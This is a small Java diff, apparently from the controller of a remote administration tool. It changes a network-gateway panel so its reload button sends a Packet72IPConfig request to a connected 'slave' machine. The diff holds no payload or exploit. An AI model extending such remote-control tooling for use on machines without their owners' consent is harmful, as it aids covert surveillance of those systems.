@@ -15,6 +15,7 @@ import javax.swing.ScrollPaneConstants;
 
 import com.redpois0n.Slave;
 import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet72IPConfig;
 
 @SuppressWarnings("serial")
 public class PanelControlNetGateway extends PanelControlParent {
@@ -36,7 +37,7 @@ public class PanelControlNetGateway extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				textPane.setText("");
-				slave.addToSendQueue(OutgoingHeader.IPCONFIG);
+				slave.addToSendQueue(new Packet72IPConfig());
 			}
 		});
 		
